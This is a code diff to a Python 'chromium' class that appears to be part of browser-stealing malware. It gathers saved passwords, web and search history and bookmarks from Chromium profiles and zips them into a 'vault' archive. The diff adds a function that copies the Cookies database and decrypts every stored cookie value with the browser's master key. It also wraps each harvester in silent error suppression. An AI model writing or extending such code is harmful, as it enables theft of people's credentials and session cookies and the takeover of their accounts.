@@ -372,6 +372,7 @@ class chromium():
             self.masterkey = self.get_master_key(path + '\\Local State')
             self.files = [
                 '.\\' + name + '-passwords.txt',
+                '.\\' + name + '-cookies.txt',
                 '.\\' + name + '-web-history.txt',
                 '.\\' + name + '-search-history.txt',
                 '.\\' + name + '-bookmarks.txt',
@@ -380,13 +381,22 @@ class chromium():
             for file in self.files:
                 with open(file, 'w') as f:
                     pass
-
+            
+            self.funcs = [
+                self.passwords,
+                self.cookies,
+                self.web_history,
+                self.search_history,
+                self.bookmarks,
+            ]
+            
             for profile in self.profiles:
-                self.password(name, path, profile)
-                self.web_history(name, path, profile)
-                self.search_history(name, path, profile)
-                self.bookmarks(name, path, profile)
-
+                for func in self.funcs:
+                    try:
+                        func(name, path, profile)
+                    except:
+                        pass
+                    
             with ZipFile('.\\' + name + '-vault.zip', 'w') as zip:
                 for file in self.files:
                     zip.write(file)
@@ -419,8 +429,8 @@ class chromium():
         decrypted_pass = decrypted_pass[:-16].decode()
 
         return decrypted_pass
-
-    def password(self, name: str, path: str, profile: str) -> None:
+    
+    def passwords(self, name: str, path: str, profile: str) -> None:
         path += '\\' + profile + '\\Login Data'
         if not os.path.isfile(path):
             return
@@ -435,10 +445,31 @@ class chromium():
                 if url != "" and username != "" and password != "":
                     f.write("Username: {:<40} Password: {:<40} URL: {}\n".format(
                         username, password, url))
+                
         cursor.close()
         conn.close()
         os.remove(vault)
 
+    def cookies(self, name: str, path: str, profile: str) -> None:
+        path += '\\' + profile + '\\Network\\Cookies'
+        if not os.path.isfile(path):
+            return
+        vault = name.title() + '-Vault.db'
+        shutil.copy2(path, vault)
+        conn = sqlite3.connect(vault)
+        cursor = conn.cursor()
+        with open('.\\' + name + '-cookies.txt', 'a', encoding="utf-8") as f:
+            for res in cursor.execute("SELECT host_key, name, encrypted_value FROM cookies").fetchall():
+                host_key, name, encrypted_value = res
+                value = self.decrypt_password(encrypted_value, self.masterkey)
+                if host_key != "" and name != "" and value != "":
+                    f.write("Host: {:<40} Name: {:<40} Value: {}\n".format(
+                        host_key, name, value))
+                
+        cursor.close()
+        conn.close()
+        os.remove(vault)
+    
     def web_history(self, name: str, path: str, profile: str) -> None:
         path += '\\' + profile + '\\History'
         if not os.path.isfile(path):
